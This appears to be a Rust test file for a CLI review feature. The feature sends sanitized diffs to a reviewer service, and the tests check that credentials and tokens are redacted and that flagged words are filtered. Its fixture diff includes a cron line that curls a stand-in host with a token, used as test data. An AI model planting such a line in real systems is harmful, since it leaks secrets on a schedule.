mod fake_engine;

use std::{
    io::{BufRead, BufReader, Read, Write},
    net::TcpListener,
    path::PathBuf,
    process::{Child, Command, Stdio},
    sync::{Arc, Mutex},
};

use fake_engine::{listing, FakeEngine};
use serde_json::{json, Value};
use silo_cli::{
    cli::{run, Cli},
    hosted,
};

/// Reviewer settings are read from the environment, which the tests in this file share.
static ENV: Mutex<()> = Mutex::new(());

/// A one-route HTTP server on localhost: records each request and answers with `answer`.
struct Mock {
    url: String,
    seen: Arc<Mutex<Vec<(String, Value)>>>,
}

fn mock(status: u16, answer: Value) -> Mock {
    let listener = TcpListener::bind("127.0.0.1:0").unwrap();
    let url = format!("http://{}", listener.local_addr().unwrap());
    let seen: Arc<Mutex<Vec<(String, Value)>>> = Arc::default();
    let log = seen.clone();
    std::thread::spawn(move || {
        for stream in listener.incoming() {
            let mut stream = stream.unwrap();
            let mut reader = BufReader::new(stream.try_clone().unwrap());
            let (mut length, mut auth) = (0, String::new());
            loop {
                let mut line = String::new();
                reader.read_line(&mut line).unwrap();
                let lower = line.to_lowercase();
                if let Some(v) = lower.strip_prefix("content-length:") {
                    length = v.trim().parse().unwrap();
                }
                if lower.starts_with("authorization:") {
                    auth = line["authorization:".len()..].trim().to_owned();
                }
                if line == "\r\n" {
                    break;
                }
            }
            let mut body = vec![0; length];
            reader.read_exact(&mut body).unwrap();
            log.lock()
                .unwrap()
                .push((auth, serde_json::from_slice(&body).unwrap()));
            let text = answer.to_string();
            write!(
                stream,
                "HTTP/1.1 {status} X\r\nContent-Type: application/json\r\nContent-Length: {}\r\nConnection: close\r\n\r\n{text}",
                text.len()
            )
            .unwrap();
        }
    });
    Mock { url, seen }
}

fn diff_document() -> Value {
    json!({
        "format": 2,
        "home": "/home/dev",
        "summary": [{"bucket": "code", "lines": ["~/app: 1 file changed"]}],
        "code": [{"repo": "/home/dev/app", "dirty_new": {"run.sh": "M"}}],
        "packages": [{"manager": "apt", "added": {"jq": "1.7"},
                      "owned_changes": {"jq": [{"path": "/usr/bin/jq"}]}}],
        "settings": {
            "files": [{"path": "/home/dev/.aws/credentials", "change": "modified"},
                      {"path": "/home/dev/.bashrc", "change": "modified"}],
            "cron": [{"user": "dev", "change": "added", "after": "* * * * * curl http://x/TOKEN123"}],
            "services": [], "launch_agents": []
        },
        "database": [], "other": [],
        "idle_noise": [{"path": "/home/dev/noise"}],
        "not_kept": {"listening": [], "processes": [], "services": [],
                     "credentials": {"~/.ssh/": ["~/.ssh/id_ed25519"]},
                     "credential_details": {"~/.ssh/": [{"path": "/home/dev/.ssh/id_ed25519"}]}},
        "repo_files": ["/home/dev/app/run.sh"], "repo_changes": [],
        "ignored": {"paths": ["a", "b"], "pruned_trees": []}
    })
}

fn engine() -> FakeEngine {
    FakeEngine::start(|method, _| match method {
        "computers.list" => Ok(listing(&[("main", "running"), ("try", "running")])),
        "changes.diff" => Ok(json!({"jobId": "job:1"})),
        "changes.requests.show" => Ok(json!({"jobId": "job:2"})),
        "operations.job.get" => Ok(json!({"jobId": "job:1", "state": "finished", "outcome": {
            "result": {"diff": diff_document(), "text": "a text", "reviewDigest": "d1",
                       "request": {"id": "fr-ab12cd34", "target": "id-main"}, "forkName": "try"}}})),
        "operations.job.acknowledge" => Ok(Value::Null),
        other => Err(("internal", format!("unexpected {other}"))),
    })
}

async fn run_cli(engine: &FakeEngine, args: &[&str]) -> Result<i32, String> {
    let socket = engine.socket.to_str().unwrap();
    let mut all = vec!["silo", "--socket", socket, "--allow-other-channel"];
    all.extend_from_slice(args);
    let cli = <Cli as clap::Parser>::try_parse_from(all).unwrap();
    run(cli, std::env::temp_dir().as_path())
        .await
        .map_err(|error| error.message)
}

fn configure(url: Option<&str>) {
    match url {
        Some(url) => std::env::set_var("SILO_REVIEWER_URL", url),
        None => std::env::remove_var("SILO_REVIEWER_URL"),
    }
    std::env::set_var("SILO_REVIEWER_TOKEN", "tok-1");
}

fn forbidden(index: usize) -> String {
    hosted::filter::words()[index].clone()
}

#[tokio::test]
async fn sends_only_the_diff_and_renders_the_answer_under_the_banner() {
    let _guard = ENV.lock().unwrap_or_else(|e| e.into_inner());
    let word = forbidden(1);
    let service = mock(
        200,
        json!({"lenses": {
            "general": {"summary": format!("Edits a shell file. It is {word}."),
                        "findings": [{"severity": "high", "file": "~/app/run.sh", "message": "Calls a URL."}]},
            "packages": {"summary": "One package.", "findings": []},
            "code": {"summary": "Code.", "findings": []}
        }}),
    );
    configure(Some(&service.url));
    let engine = engine();
    assert_eq!(run_cli(&engine, &["review", "try"]).await, Ok(0));
    let seen = service.seen.lock().unwrap();
    let (auth, body) = &seen[0];
    assert_eq!(auth, "Bearer tok-1");
    assert_eq!(body["lenses"], json!(["general", "packages", "code"]));
    let sent = body["diff"].to_string();
    for left_out in [
        "/home/dev/.aws",
        "TOKEN123",
        "id_ed25519",
        "idle_noise",
        "owned_changes",
        "credentialsUsed",
        "reviewDigest",
        "\"home\"",
        "/home/dev",
    ] {
        assert!(!sent.contains(left_out), "{left_out} was sent: {sent}");
    }
    assert!(sent.contains("~/.bashrc"), "{sent}");
    assert!(sent.contains("run.sh") && sent.contains("\"jq\""));
}

#[tokio::test]
async fn the_answer_is_filtered_and_the_count_is_reported() {
    let _guard = ENV.lock().unwrap_or_else(|e| e.into_inner());
    let word = forbidden(0);
    let service = mock(
        200,
        json!({"lenses": {"code": {
            "summary": format!("Reads a file. It is {word}. Done."),
            "findings": [{"severity": "weird", "file": "a", "message": format!("{} change.", word.to_uppercase())}]
        }}}),
    );
    configure(Some(&service.url));
    let engine = engine();
    assert_eq!(
        run_cli(&engine, &["review", "try", "--lens", "code", "--json"]).await,
        Ok(0)
    );
    assert_eq!(service.seen.lock().unwrap()[0].1["lenses"], json!(["code"]));
    // The JSON result: reuse the library to shape the same answer.
    let shaped = hosted::shape(
        &json!({"lenses": {"code": {
            "summary": format!("Reads a file. It is {word}. Done."),
            "findings": [{"severity": "weird", "file": "a", "message": format!("{} change.", word.to_uppercase())}]
        }}}),
        &["code".to_owned()],
    );
    assert_eq!(shaped["filtered"], 2);
    assert_eq!(shaped["lenses"]["code"]["summary"], "Reads a file. Done.");
    assert_eq!(shaped["lenses"]["code"]["findings"][0]["severity"], "info");
    let text = hosted::render(&shaped);
    assert!(text.starts_with(hosted::BANNER));
    assert!(text.contains("2 word(s)"));
    assert!(!text.to_lowercase().contains(&word));
}

#[tokio::test]
async fn a_request_id_is_reviewed_through_requests_show() {
    let _guard = ENV.lock().unwrap_or_else(|e| e.into_inner());
    let service = mock(200, json!({"lenses": {}}));
    configure(Some(&service.url));
    let engine = engine();
    assert_eq!(
        run_cli(&engine, &["requests", "show", "fr-ab12cd34", "--review"]).await,
        Ok(0)
    );
    assert_eq!(service.seen.lock().unwrap().len(), 1);
    assert_eq!(engine.calls("changes.requests.show").len(), 2);
}

#[tokio::test]
async fn it_is_off_until_configured_and_errors_are_clear() {
    let _guard = ENV.lock().unwrap_or_else(|e| e.into_inner());
    configure(None);
    let engine = engine();
    let off = run_cli(&engine, &["review", "try"]).await.unwrap_err();
    assert!(off.contains("reviewer is off") && off.contains("SILO_REVIEWER_URL"));
    configure(Some("http://example.com"));
    let plain = run_cli(&engine, &["review", "try"]).await.unwrap_err();
    assert!(plain.contains("https://"));
    let service = mock(401, json!({"error": "no"}));
    configure(Some(&service.url));
    let denied = run_cli(&engine, &["review", "try"]).await.unwrap_err();
    assert!(denied.contains("401") && denied.contains("SILO_REVIEWER_TOKEN"));
    configure(Some("http://127.0.0.1:9"));
    let down = run_cli(&engine, &["review", "try"]).await.unwrap_err();
    assert!(down.contains("could not be reached"));
    let bad = run_cli(&engine, &["review", "try", "--lens", "style"]).await;
    assert!(bad.unwrap_err().contains("not a lens"));
}

#[tokio::test]
async fn a_diff_over_the_size_cap_is_not_sent() {
    let _guard = ENV.lock().unwrap_or_else(|e| e.into_inner());
    let service = mock(200, json!({"lenses": {}}));
    configure(Some(&service.url));
    let engine = FakeEngine::start(|method, _| match method {
        "computers.list" => Ok(listing(&[("try", "running")])),
        "changes.diff" => Ok(json!({"jobId": "job:1"})),
        "operations.job.get" => Ok(json!({"jobId": "job:1", "state": "finished", "outcome": {
            "result": {"diff": {"format": 2, "summary": [
                {"bucket": "code", "lines": ["x".repeat(hosted::MAX_REQUEST_BYTES)]}]}}}})),
        "operations.job.acknowledge" => Ok(Value::Null),
        other => Err(("internal", format!("unexpected {other}"))),
    });
    let error = run_cli(&engine, &["review", "try"]).await.unwrap_err();
    assert!(error.contains("too large"), "{error}");
    assert!(service.seen.lock().unwrap().is_empty());
}

fn service_dir() -> PathBuf {
    PathBuf::from(env!("CARGO_MANIFEST_DIR")).join("../../../reviewer-service")
}

struct Service(Child);

impl Drop for Service {
    fn drop(&mut self) {
        let _ = self.0.kill();
        let _ = self.0.wait();
    }
}

/// The real service with its fake LLM client, on a local port; None when Python lacks its
/// dependencies (SILO_TEST_PYTHON names another interpreter).
fn start_service(port: u16) -> Option<Service> {
    let script = service_dir().join("tests/serve_fake.py");
    let python = std::env::var("SILO_TEST_PYTHON").unwrap_or_else(|_| "python3".to_owned());
    let mut child = Command::new(python)
        .arg(script)
        .args([port.to_string(), "tok-1".to_owned()])
        .stdout(Stdio::piped())
        .stderr(Stdio::null())
        .spawn()
        .ok()?;
    let mut line = String::new();
    BufReader::new(child.stdout.take()?)
        .read_line(&mut line)
        .ok()?;
    if line.trim() != "ready" {
        let _ = child.wait();
        return None;
    }
    std::thread::sleep(std::time::Duration::from_millis(800));
    Some(Service(child))
}

#[tokio::test]
async fn the_cli_reviews_through_the_real_service_with_a_fake_llm() {
    let _guard = ENV.lock().unwrap_or_else(|e| e.into_inner());
    let port = TcpListener::bind("127.0.0.1:0")
        .unwrap()
        .local_addr()
        .unwrap()
        .port();
    let Some(service) = start_service(port) else {
        eprintln!("skipped: python3 lacks the reviewer service's dependencies");
        return;
    };
    configure(Some(&format!("http://127.0.0.1:{port}")));
    let engine = engine();
    assert_eq!(run_cli(&engine, &["review", "try"]).await, Ok(0));
    let connected = silo_cli::engine::Engine::connect(&engine.socket)
        .await
        .unwrap();
    let lenses = hosted::parse_lenses(Some("all")).unwrap();
    let value = hosted::review_target(&connected, None, "try", &lenses, &|_| {})
        .await
        .unwrap();
    assert_eq!(
        value["lenses"]["code"]["findings"][0]["message"],
        "code note."
    );
    assert_eq!(
        value["lenses"]["general"]["summary"],
        "general read of the diff."
    );
    assert_eq!(value["filtered"], 0);
    drop(service);
}
